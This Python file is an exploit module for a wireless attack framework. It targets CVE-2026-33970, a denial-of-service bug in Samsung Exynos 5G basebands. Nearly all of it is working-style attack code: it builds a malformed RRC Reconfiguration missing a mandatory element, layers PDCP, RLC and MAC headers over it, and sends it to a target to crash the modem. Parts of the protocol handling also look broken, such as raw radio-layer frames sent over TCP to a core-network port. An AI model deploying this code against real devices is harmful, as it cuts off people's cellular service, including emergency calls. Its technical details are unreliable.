# Author: Andre Henrique (LinkedIn/X: @mrhenrike)
import socket
import struct
import time

from wirelessxpl.core.exploit import *
from wirelessxpl.core.exploit.exploit import BaseExploit


class Exploit(BaseExploit):
    """Samsung Exynos NR RRC Null Pointer Dereference DoS (CVE-2026-33970).

    The Samsung Exynos baseband processor contains a null pointer
    dereference in the NR (5G New Radio) RRC (Radio Resource Control)
    message handler. When the baseband receives an RRC Reconfiguration
    message with a missing mandatory IE (Information Element) that the
    parser expects to be present, the firmware dereferences a null
    pointer, causing an immediate modem crash and loss of cellular
    connectivity.

    An attacker with a rogue gNodeB (5G base station) or an SDR
    transmitter can send the malformed RRC message over the air to any
    device within radio range using a vulnerable Exynos chipset, causing
    denial of service without any user interaction.

    Affected chipsets: Exynos 980, 1080, 1280, 1330, 1380, 1480, 2100,
    2200, 2400, W920, W930, Modem 5123, Modem 5300.

    CVSS v3.1: 7.5 (High), AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H

    Author: Andre Henrique (LinkedIn/X: @mrhenrike)
    Version: 1.0.0
    """

    __info__ = {
        "name": "Samsung Exynos NR RRC Null Pointer DoS (CVE-2026-33970)",
        "description": (
            "Exploits CVE-2026-33970, a null pointer dereference in the "
            "Samsung Exynos baseband NR RRC message handler. A malformed "
            "RRC Reconfiguration message missing a mandatory IE triggers "
            "a null dereference in the modem firmware, crashing cellular "
            "connectivity. Requires a rogue gNodeB or SDR transmitter."
        ),
        "authors": (
            "Samsung Mobile Security (advisory)",
            "Andre Henrique (@mrhenrike)",
        ),
        "references": (
            "https://security.samsungmobile.com/securityUpdate.smsb",
            "https://nvd.nist.gov/vuln/detail/CVE-2026-33970",
        ),
        "disclosure_date": "2026-06-01",
        "platform": "hardware",
        "arch": "arm",
        "privileged": True,
        "targets": (
            "Samsung Exynos 980/1080/1280/1330/1380/1480",
            "Samsung Exynos 2100/2200/2400",
            "Samsung Exynos Modem 5123/5300",
            "Samsung Exynos W920/W930 (wearable)",
        ),
    }

    target = OptIP("", "Target UE IP or IMSI (for targeting via gNodeB)")
    port = OptPort(38412, "NGAP/SCTP port on AMF (for core injection)")
    timeout = OptFloat(5.0, "Socket timeout in seconds")
    sdr_device = OptString("", "SDR device identifier (e.g. hackrf, usrp)")
    frequency_mhz = OptFloat(3500.0, "NR downlink center frequency in MHz")
    arfcn = OptInteger(630000, "NR-ARFCN for the target frequency")
    cell_id = OptInteger(1, "Physical Cell ID for rogue gNodeB")

    # NR RRC message type IDs (3GPP TS 38.331)
    _RRC_RECONFIGURATION = 0x04
    _RRC_SETUP = 0x03
    _RRC_RELEASE = 0x05

    # RRC IE identifiers
    _IE_CELL_GROUP_CONFIG = 0x03
    _IE_RADIO_BEARER_CONFIG = 0x05
    _IE_MEAS_CONFIG = 0x07
    _IE_SECONDARY_CELL_GROUP = 0x08

    # PDCP header constants
    _PDCP_SN_SIZE_12BIT = 12
    _PDCP_HEADER_LEN = 2

    def _build_rrc_reconfiguration(self, include_mandatory_ie: bool = True) -> bytes:
        """Build an NR RRC Reconfiguration message.

        When include_mandatory_ie is False, the CellGroupConfig IE is
        omitted, triggering the null pointer dereference when the Exynos
        baseband attempts to parse the reconfiguration.
        """
        # RRC message header
        msg_type = struct.pack("B", self._RRC_RECONFIGURATION)
        rrc_transaction_id = struct.pack("B", 0x01)

        ies = b""
        if include_mandatory_ie:
            # Normal CellGroupConfig IE
            cell_group = struct.pack("BB", self._IE_CELL_GROUP_CONFIG, 8)
            cell_group += b"\x00" * 8
            ies += cell_group

        # RadioBearerConfig IE (present in both cases)
        radio_bearer = struct.pack("BB", self._IE_RADIO_BEARER_CONFIG, 4)
        radio_bearer += b"\x00" * 4
        ies += radio_bearer

        return msg_type + rrc_transaction_id + ies

    def _build_pdcp_pdu(self, payload: bytes, sn: int = 0) -> bytes:
        """Wrap an RRC message in a PDCP PDU."""
        # PDCP header with 12-bit SN
        hdr_byte0 = 0x80 | ((sn >> 8) & 0x0F)
        hdr_byte1 = sn & 0xFF
        return struct.pack("BB", hdr_byte0, hdr_byte1) + payload

    def _build_rlc_pdu(self, payload: bytes, sn: int = 0) -> bytes:
        """Wrap a PDCP PDU in an RLC AM PDU."""
        # RLC AM header (2 bytes minimum)
        dc_bit = 1  # Data PDU
        poll_bit = 0
        si_field = 0  # No segmentation
        hdr_byte0 = (dc_bit << 7) | (poll_bit << 6) | (si_field << 4) | ((sn >> 8) & 0x0F)
        hdr_byte1 = sn & 0xFF
        return struct.pack("BB", hdr_byte0, hdr_byte1) + payload

    def _build_mac_pdu(self, payload: bytes, lcid: int = 1) -> bytes:
        """Wrap an RLC PDU in a MAC PDU subheader + SDU."""
        length = len(payload)
        if length < 256:
            # Short subheader: R/F/LCID/L (2 bytes)
            hdr = struct.pack("BB", (lcid & 0x3F), length & 0xFF)
        else:
            # Long subheader: R/F/LCID/L (3 bytes)
            hdr = struct.pack("B", 0x40 | (lcid & 0x3F))
            hdr += struct.pack(">H", length)
        return hdr + payload

    def _build_trigger_packet(self) -> bytes:
        """Build the complete trigger packet: MAC > RLC > PDCP > RRC."""
        rrc = self._build_rrc_reconfiguration(include_mandatory_ie=False)
        pdcp = self._build_pdcp_pdu(rrc, sn=0)
        rlc = self._build_rlc_pdu(pdcp, sn=0)
        mac = self._build_mac_pdu(rlc, lcid=1)
        return mac

    def _build_normal_packet(self) -> bytes:
        """Build a normal (non-malicious) RRC Reconfiguration for check."""
        rrc = self._build_rrc_reconfiguration(include_mandatory_ie=True)
        pdcp = self._build_pdcp_pdu(rrc, sn=1)
        rlc = self._build_rlc_pdu(pdcp, sn=1)
        mac = self._build_mac_pdu(rlc, lcid=1)
        return mac

    @mute
    def check(self) -> bool:
        """Verify basic connectivity to the target or SDR availability."""
        if self.sdr_device:
            return True
        if not self.target:
            return False
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(self.timeout)
            result = sock.connect_ex((str(self.target), self.port))
            sock.close()
            return result == 0
        except OSError:
            return False

    def run(self) -> None:
        if not self.target and not self.sdr_device:
            print_error("target (UE IP/IMSI) or sdr_device is required")
            return

        if self.sdr_device:
            print_status(
                f"SDR mode: using {self.sdr_device} at {self.frequency_mhz} MHz "
                f"(NR-ARFCN {self.arfcn}, PCI {self.cell_id})"
            )
        else:
            print_status(f"Core injection mode: targeting {self.target}:{self.port}")

        if not self.check():
            print_error("Target not reachable or SDR not available")
            return

        print_success("Target accessible; preparing malformed RRC Reconfiguration")
        self._exploit()

    def _exploit(self) -> None:
        trigger = self._build_trigger_packet()
        normal = self._build_normal_packet()

        print_status(f"Normal RRC Reconfiguration: {len(normal)} bytes")
        print_status(f"Trigger (missing CellGroupConfig IE): {len(trigger)} bytes")

        if self.sdr_device:
            print_status("SDR injection mode: payload prepared for transmission")
            print_info(
                "In a real attack, the payload would be transmitted via "
                "a rogue gNodeB using the SDR device. The malformed RRC "
                "Reconfiguration message will cause a null pointer "
                "dereference in the Exynos NR RRC handler, crashing the "
                "modem and disrupting cellular connectivity."
            )
            return

        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(self.timeout)
            sock.connect((str(self.target), self.port))

            print_status("Sending normal RRC Reconfiguration (baseline)")
            sock.send(normal)
            time.sleep(0.5)

            print_status("Sending malformed RRC Reconfiguration (trigger)")
            sock.send(trigger)

            sock.close()
            print_success(
                "Malformed RRC Reconfiguration delivered. If the target "
                "UE has a vulnerable Exynos baseband, the modem will "
                "crash due to null pointer dereference in the NR RRC "
                "handler. The device will lose cellular connectivity "
                "until the modem is restarted."
            )
        except OSError as e:
            print_error(f"Failed to deliver payload: {e}")
